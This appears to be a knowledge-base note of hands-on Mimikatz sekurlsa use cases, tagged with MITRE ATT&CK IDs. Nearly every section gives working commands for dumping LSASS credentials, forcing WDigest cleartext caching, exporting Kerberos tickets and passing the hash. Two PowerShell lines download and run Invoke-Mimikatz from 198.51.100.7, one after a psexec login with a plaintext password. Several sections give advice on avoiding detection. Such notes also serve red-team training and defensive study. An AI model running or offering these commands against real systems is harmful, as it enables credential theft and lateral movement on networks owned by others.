# Mimikatz — sekurlsa — Hands-On Use Cases

Every scenario below builds on the same core mechanic documented in `01 - Overview.md` §How It Works — an `OpenProcess` (or minidump-file open) against `lsass.exe`'s memory, followed by build-specific parsing. What changes is *which* provider(s) get read, whether the read is live or offline, and how much effort goes into not touching disk. MITRE ATT&CK IDs are tagged per scenario.

## Contents
- [Full Live Credential Dump](#full-live-credential-dump)
- [Offline Analysis of a Dumped LSASS Minidump](#offline-analysis-of-a-dumped-lsass-minidump)
- [WDigest Cleartext Extraction](#wdigest-cleartext-extraction)
- [Isolated Single-Provider Extraction](#isolated-single-provider-extraction)
- [Kerberos Ticket Harvesting for Pass-the-Ticket](#kerberos-ticket-harvesting-for-pass-the-ticket)
- [Pass-the-Hash to Spawn a Process as Another User](#pass-the-hash-to-spawn-a-process-as-another-user)
- [Pass-the-Hash with an AES Key Instead of NTLM](#pass-the-hash-with-an-aes-key-instead-of-ntlm)
- [In-Memory Reflective Execution via PowerShell](#in-memory-reflective-execution-via-powershell)
- [Chained Use After Remote Code Execution](#chained-use-after-remote-code-execution)
- [Extraction from an Established Meterpreter Session](#extraction-from-an-established-meterpreter-session)
- [DPAPI Master-Key and Backup-Key Extraction](#dpapi-master-key-and-backup-key-extraction)
- [CloudAP / Entra-Joined Device Credential Extraction](#cloudap--entra-joined-device-credential-extraction)

---

## Full Live Credential Dump

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
The baseline case. Requires local admin and a successful `privilege::debug`. Prints every credential every loaded provider currently has cached, per logon session — LM/NTLM hashes always; plaintext passwords only for whichever providers have caching enabled on this build/config (see [WDigest Cleartext Extraction](#wdigest-cleartext-extraction) below).

## Offline Analysis of a Dumped LSASS Minidump

**MITRE ATT&CK:** T1003.001, plus [T1560](https://attack.mitre.org/techniques/T1560/) (Archive Collected Data) if the `.dmp` is compressed/staged for exfiltration before analysis

```
# On the target (or via a signed LOLBin, avoiding a second mimikatz touch on that host):
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lsass.dmp full

# Transfer lsass.dmp off the target, then on an analysis machine:
mimikatz # sekurlsa::minidump C:\loot\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
This is the **quiet-target** variant: the only LSASS-memory-read event the target ever logs is whatever tool produced the `.dmp` (here, `comsvcs.dll`'s MiniDump export — no mimikatz binary or reflective load ever touches the target host at all). All subsequent parsing happens entirely on the operator's own analysis machine. The `.dmp`'s recorded architecture must match the mimikatz build used to read it (see `01 - Overview.md`).

## WDigest Cleartext Extraction

**MITRE ATT&CK:** T1003.001, plus [T1112](https://attack.mitre.org/techniques/T1112/) (Modify Registry) if the operator force-enables the provider first

```
# Check current state (0 = disabled/default post-KB2871997, 1 = cleartext caching enabled)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

# If disabled, an operator with sufficient access can force it back on...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

# ...but the value only affects *new* logon sessions established after the change (lock/unlock,
# RDP reconnect, runas, a scheduled task firing) — it does not retroactively decrypt an
# already-cached session. Once a fresh session exists:
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest
```
Windows 8.1/Server 2012 R2 and later ship with `UseLogonCredential=0` by default; **KB2871997** backported the same default-disabled posture (and the registry toggle to override it) to Windows 7/Server 2008 R2 and up. On an unpatched/legacy host, or any host where this key has been flipped to `1`, WDigest caches the logon password in **reversibly-encrypted, not hashed, form** specifically so it can respond to Digest-authentication challenges — which is exactly what `sekurlsa::wdigest` recovers in cleartext.

## Isolated Single-Provider Extraction

**MITRE ATT&CK:** T1003.001

```
mimikatz # privilege::debug
mimikatz # sekurlsa::msv          # LM/NTLM hashes only
mimikatz # sekurlsa::kerberos     # Kerberos-cached credentials/PINs only
mimikatz # sekurlsa::credman      # Credential Manager entries only
```
Running a single provider command instead of the full `logonpasswords` sweep is a smaller, more targeted memory read — useful when the operator only needs one credential type and wants to minimize the volume (and console noise) of what gets pulled and potentially logged/relayed over a C2 channel.

## Kerberos Ticket Harvesting for Pass-the-Ticket

**MITRE ATT&CK:** T1003.001, plus [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
Exports every Kerberos ticket (TGT and TGS) found across **every logon session in LSASS**, not just the caller's own — each written out as a `.kirbi` file. This is broader than the `kerberos` module's own `kerberos::list`, which only sees the calling process's own session. The exported tickets feed directly into `kerberos::ptt` for pass-the-ticket reuse — full ticket-forgery/injection depth lives in the (planned) `kerberos (Golden-Silver Ticket)/` sub-module.

## Pass-the-Hash to Spawn a Process as Another User

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash), plus T1003.001 to obtain the hash in the first place

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd.exe
```
Spawns a new, suspended `cmd.exe` under `administrator`'s logon context, then — per `01 - Overview.md`'s verified mechanics — **reopens LSASS with `PROCESS_VM_OPERATION`/`PROCESS_VM_WRITE` added** to patch the new process's in-memory NTLM material before resuming it. No plaintext password is ever needed or produced; the resulting `cmd.exe` authenticates outbound (e.g. to a file share or another host) as `administrator` using the injected hash. Add `/impersonate` to instead impersonate the token on the current thread and terminate the spawned helper process rather than leaving it running.

## Pass-the-Hash with an AES Key Instead of NTLM

**MITRE ATT&CK:** T1550.002 · T1003.001

```
mimikatz # sekurlsa::pth /user:svc-backup /domain:CORP /run:cmd.exe /aes256:<64-hex-char-aes256-key>
```
`/aes128:`/`/aes256:` substitute for `/ntlm:` and are supported from Windows 7/8 with KB2871997 or Windows 8.1+. This variant never generates the weaker RC4/NTLM authentication traffic that some detections specifically watch for — a quieter option when AES key material has already been recovered (e.g. via `sekurlsa::ekeys`).

## In-Memory Reflective Execution via PowerShell

**MITRE ATT&CK:** [T1620](https://attack.mitre.org/techniques/T1620/) (Reflective Code Loading), plus T1003.001 for the sekurlsa call itself

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
```
`Invoke-Mimikatz` carries mimikatz's DLL as an embedded Base64 blob and reflectively maps it directly into the running PowerShell process — `mimikatz.exe` never exists as a file on the target at any point. This is the primary way operators avoid the near-universal static-signature detection on the stock binary (see `00 - Mimikatz Overview.md`), at the cost of PowerShell-side telemetry (ScriptBlock logging, AMSI, Sysmon Event 1 for the `powershell.exe` process itself) becoming the relevant detection surface instead.

## Chained Use After Remote Code Execution

**MITRE ATT&CK:** [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares) for the delivery step, plus T1003.001

```bash
# 1. Land a SYSTEM shell on the target via a lateral-movement tool
psexec.py CORP/jsmith:Summer2026!@10.10.10.5

# 2. From inside that SYSTEM shell, stage and run mimikatz (or a reflective loader) in-process
C:\Windows\system32> powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.7/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'"
```
sekurlsa is rarely the *first* tool run in an intrusion — it's the payoff step once some other technique (see `Impacket/psexec/`) has already produced code execution. Because the psexec-style shell already runs as SYSTEM, `privilege::debug` succeeds trivially and no `token::elevate` step is needed.

## Extraction from an Established Meterpreter Session

**MITRE ATT&CK:** T1003.001, plus [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) for the extension-loading mechanism itself

```
meterpreter > load kiwi
meterpreter > creds_all
```
Meterpreter's `kiwi` extension reimplements sekurlsa's core credential-extraction routines as a reflectively-loaded Meterpreter extension DLL — no separate `mimikatz.exe`/`.dll` ever touches the target, and no interactive mimikatz console exists at all; `creds_all` is the one-shot equivalent of `sekurlsa::logonpasswords`. Full extension-loading mechanics and evidence are covered in `Metasploit/Meterpreter/01 - Overview.md` and `Metasploit/Meterpreter/02 - Hands-On Use Cases.md` — this note doesn't re-derive them.

## DPAPI Master-Key and Backup-Key Extraction

**MITRE ATT&CK:** T1003.001, plus [T1555](https://attack.mitre.org/techniques/T1555/) (Credentials from Password Stores) for what the recovered keys are typically used to unlock next

```
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi
mimikatz # sekurlsa::backupkeys /export
```
`sekurlsa::dpapi` pulls DPAPI master keys currently cached in LSASS memory for logged-on users; `sekurlsa::backupkeys` (x64/ARM64 only) extracts the domain's DPAPI backup key material. Either feeds an **offline** decryption of DPAPI-protected blobs recovered separately — saved browser credentials, saved RDP/VPN passwords, Credential Manager entries pulled from disk rather than memory — without needing to touch LSASS again for that later step.

## CloudAP / Entra-Joined Device Credential Extraction

**MITRE ATT&CK:** T1003.001

```
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
```
On a hybrid Azure AD/Entra-joined endpoint (Windows 10 1909+), the Cloud Authentication Provider caches its own session/PRT-adjacent material in LSASS alongside the traditional providers. `sekurlsa::cloudap` is the provider-specific pull for that material — relevant on modern enterprise-joined endpoints where classic on-prem-only providers (WDigest, TsPkg) may be less useful.
